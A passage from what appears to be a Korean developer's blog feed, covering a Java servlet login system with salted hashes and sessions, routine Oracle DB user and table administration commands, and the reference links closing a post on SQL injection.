  <li><a href="https://blog.jiniworld.me/93">MySQL Function암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
  <li><a href="https://imlena94.tistory.com/entry/SQL-Injection-%EA%B8%B0%EC%B4%88-MSORACLEMY-SQL-%EC%8B%9C%EA%B0%84%EC%A7%80%EC%97%B0-%EC%A3%BC%EC%84%9D-%EB%93%B1">SQL Injection 기초 - MS/ORACLE/MY SQL , 시간지연, 주석 등 (tistory.com)</a></li>
  <li><a href="https://jhnyang.tistory.com/470">SQL 정렬하기 order by 쿼리 사용법 1, 2 desc 의미 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL" /><category term="Oracle DB" /><category term="SQL Injection" /><category term="Java" /><summary type="html"><![CDATA[SQL Injection 이란? sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다. 웹 해킹 기술중 하나이다.]]></summary></entry><entry><title type="html">웹서버 만들기(7)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/" rel="alternate" type="text/html" title="웹서버 만들기(7)" /><published>2023-04-14T00:00:00+09:00</published><updated>2023-04-15T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/"><![CDATA[<ul>
  <li>웹 서버 만들기 (1) ~ (6) 과정을 통해 웹서버와 DB서버 구현을 완료하였다.</li>
  <li>웹 서버에서 db에 저장된 데이터를 가져오는 방법도 알아보았다.</li>
</ul>

<h3 id="로그인-구현">로그인 구현</h3>
<hr />
<h5 id="로그인-인증-구조">로그인 인증 구조</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /><br /></p>

<p><br /><br /></p>

<h5 id="유저정보를-저장-하기-위한-db-특징">유저정보를 저장 하기 위한 DB 특징</h5>
<ul>
  <li>
    <p>유저의 정보를 저장하기 위해서 <code class="language-plaintext highlighter-rouge">오라클DB</code> 에서 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블을 만들어 주었다.</p>

    <table>
      <thead>
        <tr>
          <th>컬럼명</th>
          <th>데이터 타입</th>
          <th>조건</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>sid</td>
          <td>NUMBER(20)</td>
          <td>PRIMARY KEY</td>
        </tr>
        <tr>
          <td>username</td>
          <td>NVARCHAR2(32)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>email</td>
          <td>NVARCHAR2(100)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>salt</td>
          <td>VARCHAR2(30)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>password</td>
          <td>VARCHAR2(150)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>gen_time</td>
          <td>NUMBER(20)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>modifi_time</td>
          <td>NUMBER(20)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>algorithm</td>
          <td>VARCHAR2(32)|</td>
          <td> </td>
        </tr>
        <tr>
          <td>authority</td>
          <td>CHAR(1)</td>
          <td>‘0’ 또는 ‘1’ 만 올수 있다.</td>
        </tr>
      </tbody>
    </table>

    <script src="https://gist.github.com/MinGyu2/201dcfdfea3de5ae750045ffedffadab.js"></script>
  </li>
  <li>일단 로그인을 위한 루트계정을 만들어 주었다.</li>
  <li>패스워드를 바로 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블에 저장하는 것이아닌 <strong>해시</strong>계산한 값이 저장된다.<br />즉 패스워드 부분에는 <code class="language-plaintext highlighter-rouge">HASH(SALT + 유저비번)</code> 값이 저장된다.</li>
  <li><code class="language-plaintext highlighter-rouge">gen_time</code> 생성시각을 나타낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">modifi_time</code> 수정시각을 나타낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">algorithm</code> 은 어떤 해시함수를 사용하였는지 표시해 준다.(ex- SHA512 등… )</li>
  <li><code class="language-plaintext highlighter-rouge">authority</code> 는 유저가 관리자 권한을 가지는지 나타낸다.</li>
</ul>

<p><br /><br /></p>

<h5 id="db-를-관리하기-위한-클래스">DB 를 관리하기 위한 클래스</h5>
<ul>
  <li>UsersDAO 를 통해 데이터베이스와 연결하고 저장되어있는 유저정보를 불러올 수 있다.</li>
  <li>DB 서버에 있는 정보를 보다 쉽게 읽어올 수 있다.<br /><script src="https://gist.github.com/MinGyu2/7eba85df3c0d5e2f9d1a76ff2682e726.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">USERS</code> 테이블에서 읽어온 유저정보는 User 클래스에 저장하여 보다 쉽게 데이터를 읽을 수 있게 하였다.<br /><script src="https://gist.github.com/MinGyu2/025aa74454ea85396923fb446b403f7f.js"></script></li>
</ul>

<p><br /><br /></p>

<h5 id="로그인-페이지-접속">로그인 페이지 접속</h5>
<ol>
  <li>로그인을 하기 위한 url은 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> 로 설정 하였다.</li>
  <li><code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/web.xml</code> 의 파일에서 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri 가 어떤 클래스로 이어져야 설정하였다.<br /><script src="https://gist.github.com/MinGyu2/ace2c5b71179095cfefcc7e3253d7504.js"></script>즉 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri로 요청이 들어오면 <code class="language-plaintext highlighter-rouge">com.mingyu2.login.Login</code> 클래스로 요청을 전달받을 수 있다.</li>
  <li>아이디와 패스워드 입력을 받기 위한 페이지를 만들어준다. <code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/sing_in_page.jsp</code> 를 만들어 주었다. 그리고 이 페이지를 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> 로 접속 하였을 때 보여줄 것이다.<br /><script src="https://gist.github.com/MinGyu2/44c33efb670bae35a1877a99f17a2c6c.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">web.xml</code> 에서 설정한 것 처럼 <code class="language-plaintext highlighter-rouge">Login</code> 클래스에서 클라이언트의 요청을 받는다.<br />만약 클라이언트 요청에서 받은 session id 값이 존재하는 것이면 로그인 페이지에서 바로 메인페이지로 넘어간다.<br />session id 값이 존재 안한다면 <code class="language-plaintext highlighter-rouge">sing_in_page.jsp</code> 페이지를 클라이언트에게 보여준다.<br /><script src="https://gist.github.com/MinGyu2/1e30a18c7cee7f902a809e464219fdd3.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">/sign_in_page</code> uri 로 요청이 들어오면 <code class="language-plaintext highlighter-rouge">/WEB-INF/sign_in_page/sign_in_page.jsp</code> 으로 포워드되게 하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/231966307-6e9a496d-7bd9-4810-bba3-f092cac3caca.png" alt="Pasted image 20230414021004" /></li>
  <li>즉 첫 로그인이거나 세션이 만료된 상태에서 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page</code> url 로 접속하면 로그인 페이지를 보여준다.</li>
  <li>아이디와 비번을 입력하고 <code class="language-plaintext highlighter-rouge">sign in</code> 버튼을 눌러주면 <code class="language-plaintext highlighter-rouge">POST</code> 방식으로 아이디와 비밀번호를 <code class="language-plaintext highlighter-rouge">http://주소/sign_in_page/authentication</code> 로 전송한다.</li>
</ol>

<p><br /><br /></p>

<h5 id="로그인-인증-sign_in_pageauthentication-">로그인 인증 (<code class="language-plaintext highlighter-rouge">/sign_in_page/authentication</code> )</h5>
<ol>
  <li>먼저 세션 키가 존재하는지 확인하자. 존재하면 바로 메인페이지로 이동한다.</li>
  <li>post를 통해 요청이 들어오면 먼저 아이디와 비밀번호를 확인한다.</li>
  <li><code class="language-plaintext highlighter-rouge">LoginAuthentication</code>클래스의 인스턴스를 만들어준다. 인증 클래스의 <code class="language-plaintext highlighter-rouge">userAuthenticatoin</code> 함수에 유저 이름과 패스워드를 전송해준다.</li>
  <li>인증이 성공하면 <code class="language-plaintext highlighter-rouge">User</code> 정보를 얻을 수 있다. 하지만 인증에 실패하면 <code class="language-plaintext highlighter-rouge">null</code> 값을 받게된다.</li>
  <li>즉 null 값을 받아 로그인에 실패하면 <code class="language-plaintext highlighter-rouge">/sign_in_page</code> 다시 로그인 페이지로 리다이렉트 요청을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">User</code> 정보를 받으면 로그인에 성공했다는 것이다.  따라서 <code class="language-plaintext highlighter-rouge">User</code> 오브젝트를 세션에 저장하여 준다. 세션 정보는 session id를 통해 가져올 수 있다.</li>
  <li>확인해 보니 session id는 자동으로 쿠키에 저장 된다.</li>
  <li>로그인에 성공하고 session id 도 생성되었다. 마지막으로 메인 페이지로 리다이렉션 해준다.<br /></li>
</ol>

<script src="https://gist.github.com/MinGyu2/6a43536366c80a7b07529ade2c3fbf9e.js"></script>

<p><br /><br /></p>

<h5 id="비밀번호-인증-과정loginauthentication-클래스">비밀번호 인증 과정(<code class="language-plaintext highlighter-rouge">LoginAuthentication</code> 클래스)</h5>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Users</code> 테이블에 존재하는 유저인지 확인한다.</li>
  <li>존재하는 아이디면 salt 와 암호 알고리즘 유형을 가지고 온다.</li>
  <li>salt 와 입력받은 password 를 합치고 알고리즘 유형에 따라 HASH 암호화를 진행한다.</li>
  <li>이렇게 <strong>새로 만들어진 해시 암호문</strong>과 <strong>db에 저장된 해시 암호문</strong>을 비교한다.</li>
  <li>암호문들이 서로 동일하면 로그인에 성공하여 <strong>User</strong> 정보를 리턴해 준다.<br /></li>
</ol>

<script src="https://gist.github.com/MinGyu2/4ed99fbf300a5d7d8356f63efa7abd65.js"></script>

<p><br /><br /><br /></p>

<h3 id="main-페이지">Main 페이지</h3>
<hr />
<ul>
  <li>로그인에 성공하거나 <code class="language-plaintext highlighter-rouge">session id</code> 가 만료되기 전에 들어갈 수 있는 메인 화면이다.</li>
  <li>현재 로그인 된 유저 정보를 확인할 수 있다.</li>
</ul>

<h5 id="메인페이지-접속">메인페이지 접속</h5>
<ol>
  <li><code class="language-plaintext highlighter-rouge">http://주소/main_page</code> 주소를 통해 메인 페이지에 접속을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/web.xml</code> 안에 <code class="language-plaintext highlighter-rouge">/main_page</code> uri 요청이 왔을 때 연결해줘야 하는 클래스를 적어주었다.<br /><script src="https://gist.github.com/MinGyu2/a1ce521401bcd401eda9dbfc61a59c2a.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">MainPage</code> 클래스에서 <code class="language-plaintext highlighter-rouge">/main_page</code> uri 요청을 처리해 준다.<br /><script src="https://gist.github.com/MinGyu2/9ea7553e8b77f47e458607acaec9cd85.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">main_page</code> 로 요청이 들어오게 되면 먼저 session id가 존재하는지 확인한다.</li>
  <li>만약 session id가 존재하지 않는다면 로그인페이지로 리다이렉션 해준다. (<code class="language-plaintext highlighter-rouge">sign_in_page</code>)</li>
  <li>로그인에 성공한다면 관리자 권한을 가진 유저인지 확인을 한다. 관리자 권한을 가진 유저라면 <code class="language-plaintext highlighter-rouge">/main_page_root.jsp</code> 로 포워딩하고, 아니면 <code class="language-plaintext highlighter-rouge">/main_page.jsp</code> 페이지로 포워딩한다.<br /><img src="https://user-images.githubusercontent.com/31990118/231967785-38c5df57-d340-4a28-abe4-43fe9803b026.png" alt="happyhacking" /></li>
</ol>

<p><br /><br /></p>

<h5 id="jsp-메인-페이지">jsp 메인 페이지</h5>
<ul>
  <li>여기서 <code class="language-plaintext highlighter-rouge">main_page_root.jsp</code> 나 <code class="language-plaintext highlighter-rouge">main_page.page</code> 구조는 동일하다.</li>
  <li>메인페이지(<code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/main_page.jsp</code>)</li>
  <li>메인페이지(<code class="language-plaintext highlighter-rouge">MYWEB/ROOT/WEB-INF/sign_in_page/main_page_root.jsp</code>)<br /></li>
</ul>

<script src="https://gist.github.com/MinGyu2/28ecd1c7ac7ad9ef0ba296df8025341b.js"></script>
<p><br /><img src="https://user-images.githubusercontent.com/31990118/231967785-38c5df57-d340-4a28-abe4-43fe9803b026.png" alt="happyhacking" /></p>

<p><br /><br /><br /></p>

<h3 id="로그아웃-기능">로그아웃 기능</h3>
<hr />
<ul>
  <li>로그아웃을 하면 기존에 사용하던 <code class="language-plaintext highlighter-rouge">session id</code> 값을 지워준다.</li>
  <li>로그인 상태서만 로그아웃 버튼을 누를 수 있다.</li>
  <li>로그아웃 버튼을 누루면 <code class="language-plaintext highlighter-rouge">/user-logout</code> uri 로 로그아웃 요청을 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">web.xml</code> 을 살펴보면 <code class="language-plaintext highlighter-rouge">/user-logout</code> uri로 요청이 들어왔을 때  <code class="language-plaintext highlighter-rouge">com.mingyu2.login.Logout</code> 클래스로 연결해야하는 것을 볼 수 있다<br /><script src="https://gist.github.com/MinGyu2/b5501ea8b16941e7fb2759feffd4f143.js"></script></li>
  <li>로그아웃 동작 방식 및 코드<br /><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /><br /><script src="https://gist.github.com/MinGyu2/9b052bd4504a2334ec5af46d8dc68ddf.js"></script></li>
</ul>

<p><br /><br /></p>

<h3 id="url-와-uri-차이">URL 와 URI 차이</h3>
<hr />
<h5 id="url">URL</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://localhost/login_page/authentication</code> : 프로토콜 유형을 포함한 완전한 사이트 경로를 말한다.</li>
</ul>

<h5 id="uri">URI</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/login_page/authentication</code> : 주소 다음의 경로를 의미한다.</li>
</ul>

<p><br /><br /></p>

<h3 id="oracle-db-와-mysql">Oracle DB 와 MYSQL</h3>
<hr />
<ul>
  <li>서로 타입이 서로 달라 테이블을 만들때 힘들었다.</li>
  <li><a href="https://blog.naver.com/PostView.naver?blogId=seek316&amp;logNo=222108639805&amp;parentCategoryNo=&amp;categoryNo=67&amp;viewDate=&amp;isShowPopularPosts=false&amp;from=postView">MYSQL 데이터 타입 종류</a></li>
  <li><a href="https://codedragon.tistory.com/6159">오라클에 Boolean형 자료형 저장하기</a></li>
  <li><a href="https://wjheo.tistory.com/entry/%EC%98%A4%EB%9D%BC%ED%81%B4-EXISTS-%ED%99%9C%EC%9A%A9-%EC%98%88%EC%A0%9C">오라클 EXISTS 활용 예제</a></li>
  <li><a href="https://goddaehee.tistory.com/92">Oracle Dual 테이블이란?</a></li>
  <li><a href="https://string.tistory.com/29">Oracle과 MSSQL 데이터 타입 비교</a></li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://needjarvis.tistory.com/681">사이트에서 쿠키(Cookie) 확인하기 (tistory.com)</a></li>
  <li><a href="https://velog.io/@leesomyoung/DB-%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8%EB%A5%BC-%EC%95%94%ED%98%B8%ED%99%94%ED%95%98%EC%97%AC-%EC%95%88%EC%A0%84%ED%95%98%EA%B2%8C-%EC%A0%80%EC%9E%A5%ED%95%98%EA%B8%B0">DB 비밀번호를 암호화하여 안전하게 저장하기 (velog.io)</a></li>
  <li><a href="https://initialcommit.com/blog/how-to-send-data-from-servlet-to-jsp">How to send data from Java Servlet to JSP (initialcommit.com)</a></li>
  <li><a href="https://rastalion.me/%ED%9A%8C%EC%9B%90-%EA%B0%80%EC%9E%85-%EB%B0%8F-%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%84-%EC%9C%84%ED%95%9C-%ED%85%8C%EC%9D%B4%EB%B8%94-%EC%84%A4%EA%B3%84/">회원 가입 및 로그인을 위한 테이블 설계 - RastaLion’s IT Blog</a></li>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=robinnw&amp;logNo=220000301263">JSP &amp; Servlet :: 서블릿 오라클DB연동</a></li>
  <li><a href="https://linuxism.ustd.ip.or.kr/428">회원 정보 테이블 설계 시 고려 사항 (ip.or.kr)</a></li>
  <li><a href="https://gofnrk.tistory.com/79">자바 비밀번호 암호화 (SHA256,SHA512) + Salt (tistory.com)</a></li>
  <li><a href="https://kdhyo98.tistory.com/48">Java Random보단 SecureRandom 를 사용하자. </a></li>
  <li><a href="https://docs.oracle.com/en/java/javase/11/docs/specs/security/standard-names.html#securerandom-number-generation-algorithms">Java Security Standard Algorithm Names (oracle.com)</a></li>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=ding-dong&amp;logNo=221360965771">java Base64 인코딩 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://chlee21.tistory.com/148">Java Servlet session이란? :: choice blog (tistory.com)</a></li>
  <li><a href="https://hajoung56.tistory.com/59">varchar와 nvarchar의 차이 (tistory.com)</a></li>
  <li><a href="https://blog.naver.com/PostView.nhn?blogId=kinsoo007&amp;logNo=221328795448">setAttribute(),getAttribute(),sendRedirect(),getRequestDispatcher()</a></li>
  <li><a href="https://galid1.tistory.com/502">Web - cookie 와 session 분석 (servlet 예제) (tistory.com)</a></li>
  <li><a href="https://stackoverflow.com/questions/11047548/getting-cookie-in-servlet">java - Getting cookie in servlet - Stack Overflow</a></li>
  <li><a href="https://velog.io/@hyun6ik/Servlet-Http-Session">Servlet Http Session (velog.io)</a></li>
  <li><a href="https://record-than-remember.tistory.com/entry/%EB%A1%9C%EA%B7%B8%EC%9D%B8-%E2%86%92-%EB%A1%9C%EA%B7%B8%EC%95%84%EC%9B%83-%EB%B2%84%ED%8A%BC">로그인,로그아웃 Session &amp; 로그인 버튼 → 로그아웃 버튼 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="로그인" /><category term="로그아웃" /><category term="HASH" /><category term="Oracle DB" /><summary type="html"><![CDATA[웹 서버 만들기 (1) ~ (6) 과정을 통해 웹서버와 DB서버 구현을 완료하였다. 웹 서버에서 db에 저장된 데이터를 가져오는 방법도 알아보았다.]]></summary></entry><entry><title type="html">오라클DB</title><link href="http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB/" rel="alternate" type="text/html" title="오라클DB" /><published>2023-04-10T00:00:00+09:00</published><updated>2023-04-10T22:06:00+09:00</updated><id>http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB</id><content type="html" xml:base="http://localhost:4000/%EC%98%A4%EB%9D%BC%ED%81%B4DB/"><![CDATA[<h3 id="db">DB</h3>
<hr />
<ul>
  <li>여러 사람에 의해 공유되어 사용될 목적으로 통합하여 관리되는 데이터의 집합이다.</li>
  <li>자료를 구조화 하여 저장함으로써 자료 검색과 갱신의 효율을 높일 수 있다.</li>
</ul>

<h3 id="oracle-db">Oracle DB</h3>
<hr />
<ul>
  <li>DB 서버가 통합된 하나의 스토리지를 공유하는 방식이다.</li>
  <li>오라클 db 는 mysql 과 달리 데이터 베이스를 만드는 것이 아닌 사용자를 만들고 권한을 부여한다.</li>
  <li>사용자 중심으로 테이블을 관리한다.</li>
</ul>

<h4 id="oracle-사용자-생성">Oracle 사용자 생성</h4>
<ol>
  <li><code class="language-plaintext highlighter-rouge">su - oracle</code> 명령을 이용하여 <code class="language-plaintext highlighter-rouge">oracle</code> 사용자로 전환한다.<br /><img src="https://user-images.githubusercontent.com/31990118/230787698-796c4b78-52ec-44f4-a291-4b01c4ad5faa.png" alt="Pasted image 20230409214824" /></li>
  <li><code class="language-plaintext highlighter-rouge">sqlplus / as sysdba</code> 명령을 통해 <code class="language-plaintext highlighter-rouge">SQL</code> 창으로 들어가자.<br /><img src="https://user-images.githubusercontent.com/31990118/230787719-e9f09ac1-7b75-45ac-a3ff-199c2c39eabf.png" alt="Pasted image 20230409220051" /></li>
  <li><code class="language-plaintext highlighter-rouge">CREATE USER "사용자명" identified by "비번"</code> 명령을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 사용자를 생성한다.</li>
  <li>여기서 <code class="language-plaintext highlighter-rouge">ORA-65096: 공통 사용자 또는 롤 이름이 부적합합니다.</code> 라는 오류가 발생 한다면 사용자명 앞에 <code class="language-plaintext highlighter-rouge">c##</code> 또는 <code class="language-plaintext highlighter-rouge">C##</code> 을 붙여야한다.<br /><code class="language-plaintext highlighter-rouge">CREATE USER "c##사용자명" identified by "비번"</code></li>
  <li><code class="language-plaintext highlighter-rouge">select username from dba_users;</code> 명령을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 새로 만든 계정을 확인할 수 있다.</li>
  <li>새로 만든 계정에 접속할려고 하면 권한이 없다는 에러가 발생한다. <code class="language-plaintext highlighter-rouge">SYS</code> 계정으로 먼저 연결한 다음 권한을 부여해줘야 한다.<br /><script src="https://gist.github.com/MinGyu2/61b386bb2045be5bab0eb3a64d866805.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">conn 사용자명</code> 을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 새로 만든 계정으로 접속한다.<br /><script src="https://gist.github.com/MinGyu2/0b46dde8c67e9a3284935fc95b687727.js"></script></li>
  <li>테이블 생성을 해보자. 밑에는 예시 테이블이다.<br /><script src="https://gist.github.com/MinGyu2/f291c98972b64cb9d9daec3a05fcc7f6.js"></script></li>
  <li>생성한 테이블을 확인하자. <code class="language-plaintext highlighter-rouge">TEST</code> 라는 테이블이 만들어진 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/dd0fc152241100f36b8990e5178f81e5.js"></script></li>
  <li>생성한 테이블에 데이터를 넣어보자.<br /><script src="https://gist.github.com/MinGyu2/d5ae11104c21b190b8a6ce0df9ba96b5.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">ORA-01950: 테이블스페이스 'USERS'에 대한 권한이 없습니다.</code> 오류가 발생하였다.  해당 에러는 <code class="language-plaintext highlighter-rouge">users</code> 테이블스페이스에서 얼마만큼의 영역을 할당한것인지 정해지지 않은 상태이기 때문이다. 해결 방법은 해당 테이블스페이스에 대해 공간을 할당해 주면된다.<br /><script src="https://gist.github.com/MinGyu2/409ec5c72c8b7b53f90d89e9c8e466c7.js"></script><br /><script src="https://gist.github.com/MinGyu2/8ad5b5aa792babb467fa0fe44f2a48f1.js"></script></li>
  <li>이제 다시 <code class="language-plaintext highlighter-rouge">insert</code> 명령어로 데이터를 넣어보자.<br /><script src="https://gist.github.com/MinGyu2/e10317d95ba51c0efc4475e4325788b6.js"></script></li>
  <li>테이블에 잘 들어갔는지 확인해 보자. 데이터가 db에 잘 들어갔다.<br /><script src="https://gist.github.com/MinGyu2/9278303018b0d0298a546647843f12d2.js"></script></li>
</ol>

<h3 id="oracle-db-명령어">Oracle DB 명령어</h3>
<hr />
<ul>
  <li><code class="language-plaintext highlighter-rouge">show user</code> : 현재 접속중인 유저를 알 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">SELECT * FROM tab;</code> : 현재 계정의 테이블 목록 조회하기.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from all_users;</code> : 계정 정보들 확인하기.</li>
  <li><code class="language-plaintext highlighter-rouge">SELECT owner FROM dba_tables WHERE table_name= '테이블명';</code> : 테이블 소유자가 누구인지 확인할 수 있다. 단 <code class="language-plaintext highlighter-rouge">SYS</code> 유저로 접속한다음 이 명령어를 사용해야 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">CREATE USER 사용자명 IDENTIFIED BY 암호;</code> : 사용자 생성.</li>
  <li><code class="language-plaintext highlighter-rouge">ALTER USER 사용자명 IDENTIFIED BY 새로운 암호;</code> : 사용자 비밀번호 변경.</li>
  <li><code class="language-plaintext highlighter-rouge">DROP USER 사용자명 CASCADE;</code> : 사용자 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">grant 권한,권한2,.. to 계정명;</code> : 권한 부여하기.</li>
  <li><code class="language-plaintext highlighter-rouge">revoke 권한,권한2,.. from 계정명;</code> : 권한 회수하기(취소하기).</li>
  <li><code class="language-plaintext highlighter-rouge">commit;</code> : 지금 까지의 변경 사항들 적용하기.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from DBA_ROLE_PRIVS WHERE GRANTEE = 사용자명(대문자);</code> : 사용자에게 부여된 권한들을 확인할 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">delete from 테이블명;</code> : 테이블의 모든 행을 삭제한다.</li>
  <li><code class="language-plaintext highlighter-rouge">drop table 테이블명;</code> : 테이블을 삭제한다. 정확히는 휴지통으로 보낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">drop table 테이블 이름 purge;</code> : 휴지통으로 보내지 않고 테이블을 완전 삭제 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">show recyclebin;</code> : 휴지통의 테이블들 조회.</li>
  <li><code class="language-plaintext highlighter-rouge">FLASHBACK TABLE 테이블 이름 TO BEFORE DROP;</code> : 휴지통의 테이블 복원.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE RECYCLEBIN;</code> : 휴지통 비우기.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE TABLE 테이블 이름;</code> : 휴지통에서 특정 테이블만 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE DBA_RECYCLEBIN;</code> : DBA 권한으로 휴지통 내 테이블 전체 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">select status from v$instance;</code> : 현재 DB 상태 확인하기.</li>
  <li><code class="language-plaintext highlighter-rouge">DELETE FROM 테이블명 WHERE 조건;</code> : 테이블에 있는 조건에 맞는 행을 삭제한다.</li>
</ul>

<p><br /><br /></p>
<details>
<summary>
참고 사이트 목록
</summary>
<h3 id="참고-사이트">참고 사이트<a class="header-link" href="#참고-사이트" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>
<ul>
  <li><a href="https://www.centlinux.com/2022/06/install-oracle-database-21c-xe-on-rocky-linux.html">Install Oracle Database 21c XE on Rocky Linux 8 CentLinux</a></li>
  <li><a href="https://boanhack.tistory.com/171">오라클 현재 DB 상태 확인하기</a></li>
  <li><a href="https://coding-factory.tistory.com/413">Oracle ORA-65096: 공통 사용자 또는 롤 이름이 부적합합니다. 에러 해결</a></li>
  <li><a href="https://gent.tistory.com/528">Oracle 사용자 생성 및 삭제 방법 (Create User) (tistory.com)</a></li>
  <li><a href="https://sgcomputer.tistory.com/247">Oracle 오라클 기본 - 데이터 베이스 만들기(사용자 생성)</a></li>
  <li><a href="https://velog.io/@alicesykim95/Oracle%EA%B3%BC-MySQL%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90">Oracle과 MySQL의 차이점 </a></li>
  <li><a href="https://streamls.tistory.com/entry/Oracle-%EC%84%A4%EC%B9%98-%ED%9B%84-%EA%B3%84%EC%A0%95-%EC%83%9D%EC%84%B1-%EB%B0%8F-%ED%85%8C%EC%9D%B4%EB%B8%94-%EC%83%9D%EC%84%B1">Oracle 설치 후 계정 생성 및 테이블 생성</a></li>
  <li><a href="https://endorphin0710.tistory.com/28">오라클 현재 작업중인 유저 확인하기</a></li>
  <li><a href="https://yjy0755.tistory.com/22">새로운 계정을 만들어 테이블 만들어보기 </a></li>
  <li><a href="https://holics1226.tistory.com/16">ORA-01045 (로그인 실패/권한 부족)</a></li>
  <li><a href="https://www.oracletutorial.com/oracle-administration/oracle-show-tables/">Oracle Show Tables: List Tables in Oracle Database (oracletutorial.com)</a></li>
  <li><a href="https://jink1982.tistory.com/33">Oracle 데이터 입력(INSERT), 조회(SELECT), UPDATE(수정), DELETE(삭제)</a></li>
  <li><a href="https://gogogameboy.tistory.com/entry/oracle-sql-select2">오라클 SQL, SELECT문 특정 열 선택 </a></li>
